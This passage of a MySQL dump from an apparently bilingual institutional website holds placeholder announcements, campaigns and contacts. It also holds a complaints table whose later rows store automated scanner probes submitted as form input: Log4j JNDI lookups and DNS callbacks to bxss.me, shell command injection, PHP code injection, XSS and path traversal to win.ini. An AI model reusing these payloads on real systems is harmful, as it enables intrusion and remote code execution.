It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&nbsp;<strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>','<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&nbsp;<strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>\r\n\r\n<p><strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.&nbsp;<strong>Lorem Ipsum</strong>&nbsp;is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry&#39;s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.</p>',NULL,NULL,NULL,NULL,NULL,1,'mapitio-ya-kikao-kazi-cha-utendaji-wa-tnbc-5','2021-11-23 03:44:12','2021-11-23 03:44:12');
/*!40000 ALTER TABLE `announcements` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `backgrounds`
--

DROP TABLE IF EXISTS `backgrounds`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `backgrounds` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `main_bg` varchar(255) NOT NULL,
  `banner_bg` varchar(255) NOT NULL,
  `second_bg` varchar(255) DEFAULT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=utf8mb4;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `backgrounds`
--

LOCK TABLES `backgrounds` WRITE;
/*!40000 ALTER TABLE `backgrounds` DISABLE KEYS */;
/*!40000 ALTER TABLE `backgrounds` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `campaigns`
--

DROP TABLE IF EXISTS `campaigns`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `campaigns` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `title_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `title_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `summary_sw` text COLLATE utf8mb4_unicode_ci,
  `summary_en` text COLLATE utf8mb4_unicode_ci,
  `content_sw` text COLLATE utf8mb4_unicode_ci,
  `content_en` text COLLATE utf8mb4_unicode_ci,
  `photo_url` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `user_id` int(11) NOT NULL,
  `icon` text COLLATE utf8mb4_unicode_ci,
  `color` text COLLATE utf8mb4_unicode_ci,
  `specials` int(11) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `campaigns`
--

LOCK TABLES `campaigns` WRITE;
/*!40000 ALTER TABLE `campaigns` DISABLE KEYS */;
INSERT INTO `campaigns` VALUES (1,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','5f0814d557088a67edbbe7b8a2ea1fa5.jpeg',1,'real-possibilities-on-enhancement-of-the-achievable-estimates','2021-08-02 04:59:37','2022-03-07 08:08:30',0,'icon-1646651310',NULL,NULL),(2,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','19c85af6feaf700d95b0653f677ebdf9.jpeg',0,'real-possibilities-on-enhancement-of-the-achievable-estimates-2','2021-08-02 05:00:05','2022-03-07 08:08:06',0,'icon-1646651286',NULL,NULL),(3,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','e153ca773f33545712009cb3b44d8680.jpeg',1,'real-possibilities-on-enhancement-of-the-achievable-estimates-3','2021-08-02 05:03:54','2022-03-07 08:07:48',0,'icon-1646651268',NULL,NULL),(4,'Real Possibilities on Enhancement of the Achievable Estimates','Real Possibilities on Enhancement of the Achievable Estimates',NULL,NULL,'<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','<p>Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;Real Possibilities on Enhancement of the Achievable Estimates&nbsp;</p>','93179b6450b24999094300288cd655a4.jpeg\n',1,'real-possibilities-on-enhancement-of-the-achievable-estimates-4','2021-08-02 05:05:24','2022-03-07 08:07:34',0,'icon-1646651254',NULL,NULL),(5,'Demo','Demo',NULL,NULL,'<p>Demo</p>','<p>Demo</p>','f7c20b6f413b5930a0c4321b4994cef3.jpeg',1,'demo','2021-09-11 09:24:32','2022-06-21 16:27:10',0,'icon-1646651240',NULL,NULL);
/*!40000 ALTER TABLE `campaigns` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `colateral_managers`
--

DROP TABLE IF EXISTS `colateral_managers`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `colateral_managers` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `address` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint(1) NOT NULL DEFAULT '1',
  `slug` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `colateral_managers`
--

LOCK TABLES `colateral_managers` WRITE;
/*!40000 ALTER TABLE `colateral_managers` DISABLE KEYS */;
INSERT INTO `colateral_managers` VALUES (1,'good berter','07854121542','engotheta@gmail.com','P.0 58725',1,'winner-winei','2022-06-30 20:58:30','2022-06-30 21:00:01'),(2,'winner winei','07854121542','engotheta@gmail.com','P.0 58725',1,'winner-winei-2','2022-06-30 20:59:42','2022-06-30 20:59:42');
/*!40000 ALTER TABLE `colateral_managers` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `complainants`
--

DROP TABLE IF EXISTS `complainants`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `complainants` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name_en` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `name_sw` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `complainants`
--

LOCK TABLES `complainants` WRITE;
/*!40000 ALTER TABLE `complainants` DISABLE KEYS */;
/*!40000 ALTER TABLE `complainants` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `complaints`
--

DROP TABLE IF EXISTS `complaints`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `complaints` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `first_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `middle_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_name` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `work` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `designation` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `organization` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `address` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `phone` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `fax` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `customer_type` enum('Internal','External') COLLATE utf8mb4_unicode_ci NOT NULL,
  `complainant_id` int(11) NOT NULL,
  `grievance_level_id` int(11) NOT NULL,
  `subject` varchar(191) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `message` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `defect` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `location` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `date` date NOT NULL,
  `complained_before` tinyint(1) NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `email` text COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=222 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `complaints`
--

LOCK TABLES `complaints` WRITE;
/*!40000 ALTER TABLE `complaints` DISABLE KEYS */;
INSERT INTO `complaints` VALUES (19,'Abraham','','','','',NULL,NULL,'07854121542','','Internal',0,0,'Help','help need immediately','','','0000-00-00',0,'2022-06-24 05:59:49','2022-06-24 05:59:49','engotheta@gmail.com'),(20,'Abraham','','','','',NULL,NULL,'0754782563','','Internal',0,0,'Keeping all the coolnes','How does one keep all the coolness','','','0000-00-00',0,'2022-06-24 06:07:35','2022-06-24 06:07:35','dfdfdf@wineer.om'),(21,'ncMUFCMU','','','','','response.write(9950892*9373120)',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:08','2022-08-11 10:38:08','sample@email.tst'),(22,'http://bxss.me/t/fit.txt?.jpg','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:08','2022-08-11 10:38:08','sample@email.tst'),(23,'\'\"','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:08','2022-08-11 10:38:08','sample@email.tst'),(24,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','^(#$!@#$)(()))******','','','0000-00-00',0,'2022-08-11 10:38:08','2022-08-11 10:38:08','sample@email.tst'),(25,'ncMUFCMU','','','','','/xfs.bxss.me',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:08','2022-08-11 10:38:08','sample@email.tst'),(26,'ncMUFCMU','','','','','\'\"()',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:08','2022-08-11 10:38:08','sample@email.tst'),(27,'ncMUFCMU','','','','','12345\'\"\\\'\\\");|]*\0{\r\n<\0>',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(28,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,')))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))','555','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(29,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\".gethostbyname(lc(\"hitpi\".\"kfzdjnala50cb.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(113).chr(71).chr(101).chr(70).\"','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(30,'ncMUFCMU','','','','','1',NULL,'/xfs.bxss.me','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(31,'<!--','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(32,'ncMUFCMU','','','','','\'+response.write(9950892*9373120)+\'',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(33,'bxss.me','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:09','2022-08-11 10:38:09','sample@email.tst'),(34,'ncMUFCMU','','','','',')',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:10','2022-08-11 10:38:10','sample@email.tst'),(35,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','\'\"','','','0000-00-00',0,'2022-08-11 10:38:10','2022-08-11 10:38:10','sample@email.tst'),(36,'complaints','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:10','2022-08-11 10:38:10','sample@email.tst'),(37,'ncMUFCMU','','','','','\'.gethostbyname(lc(\'hitpf\'.\'chxbxauc4d396.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(122).chr(82).chr(103).chr(71).\'',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:10','2022-08-11 10:38:10','sample@email.tst'),(38,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'/xfs.bxss.me','555','','','0000-00-00',0,'2022-08-11 10:38:10','2022-08-11 10:38:10','sample@email.tst'),(39,'ncMUFCMU','','','','','\"+response.write(9950892*9373120)+\"',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:11','2022-08-11 10:38:11','sample@email.tst'),(40,'${j${::-n}di:dns${::-:}//hitwsmitvkkzzd33d7${::-.}bxss.me}zzzz','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:11','2022-08-11 10:38:11','sample@email.tst'),(41,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:11','2022-08-11 10:38:11','${@print(md5(31337))}'),(42,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','http://some-inexistent-website.acu/some_inexistent_file_with_long_name?.jpg','','','0000-00-00',0,'2022-08-11 10:38:11','2022-08-11 10:38:11','sample@email.tst'),(43,'ncMUFCMU','','','','','1',NULL,'\'\"()','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:11','2022-08-11 10:38:11','sample@email.tst'),(44,'ncMUFCMU','','','','','!(()&&!|*|*|',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(45,'ncMUFCMU','','','','','\".gethostbyname(lc(\"hitcn\".\"rumfvsowf3b72.bxss.me.\")).\"A\".chr(67).chr(hex(\"58\")).chr(102).chr(81).chr(122).chr(88).\"',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(46,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','<!--','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(47,'complaints','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(48,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst9379002'),(49,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','1some_inexistent_file_with_long_name\0.jpg','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(50,'echo ixcjwl$()\\ fmrixt\\nz^xyu||a #\' &echo ixcjwl$()\\ fmrixt\\nz^xyu||a #|\" &echo ixcjwl$()\\ fmrixt\\nz^xyu||a #','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(51,'1tAzNBTrO','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:12','2022-08-11 10:38:12','sample@email.tst'),(52,'ncMUFCMU','','','','','^(#$!@#$)(()))******',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(53,'\"+\"A\".concat(70-3).concat(22*4).concat(117).concat(69).concat(107).concat(74)+(require\"socket\"\nSocket.gethostbyname(\"hitjl\"+\"utoavvwc16755.bxss.me.\")[3].to_s)+\"','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(54,';assert(base64_decode(\'cHJpbnQobWQ1KDMxMzM3KSk7\'));','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(55,'ncMUFCMU','','','','','\'\"',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(56,'complaints/.','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(57,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'response.write(9733618*9004926)','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(58,'HttP://bxss.me/t/xss.html?%00','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(59,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','Http://bxss.me/t/fit.txt','','','0000-00-00',0,'2022-08-11 10:38:13','2022-08-11 10:38:13','sample@email.tst'),(60,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\'\"()','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(61,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','1lCkLncIO','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(62,'&echo fwhdwv$()\\ sitrde\\nz^xyu||a #\' &echo fwhdwv$()\\ sitrde\\nz^xyu||a #|\" &echo fwhdwv$()\\ sitrde\\nz^xyu||a #','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(63,'ncMUFCMU','','','','','1',NULL,')','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(64,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\'.gethostbyname(lc(\'hitrg\'.\'raqyrxnp201d1.bxss.me.\')).\'A\'.chr(67).chr(hex(\'58\')).chr(106).chr(78).chr(100).chr(67).\'','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(65,'\';print(md5(31337));$a=\'','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(66,'\'+\'A\'.concat(70-3).concat(22*4).concat(121).concat(86).concat(106).concat(70)+(require\'socket\'\nSocket.gethostbyname(\'hitgy\'+\'uafeanzn9ab14.bxss.me.\')[3].to_s)+\'','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(67,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','../../../../../../../../../../../../../../windows/win.ini','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(68,'${${:::::::::::::::::-j}ndi:dns${:::::::::::::::::-:}//dns.log4j..-3547..1b7ec${::-.}1${::-.}bxss.me}}','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(69,'ncMUFCMU\'\"()&%<acx><ScRiPt >bc6k(9529)</ScRiPt>','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:14','2022-08-11 10:38:14','sample@email.tst'),(70,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','complaints','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(71,'ncMUFCMU','','','','','<!--',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(72,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'\'+response.write(9733618*9004926)+\'','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(73,'bxss.me/t/xss.html?%00','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(74,'ncMUFCMU','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','http://bxss.me/t/fit.txt?.jpg','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(75,'ncMUFCMU','','','','','1LCpX6clO',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(76,'|echo dbeocj$()\\ quordd\\nz^xyu||a #\' |echo dbeocj$()\\ quordd\\nz^xyu||a #|\" |echo dbeocj$()\\ quordd\\nz^xyu||a #','','','','','1',NULL,'555-666-0606','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 10:38:15','2022-08-11 10:38:15','sample@email.tst'),(77,'ncMUFCMU','','','','','1',NULL,'!(()&&!|*|*|','','Internal',0,0,'1','555','','','0000-00-00',0,'2022-08-11 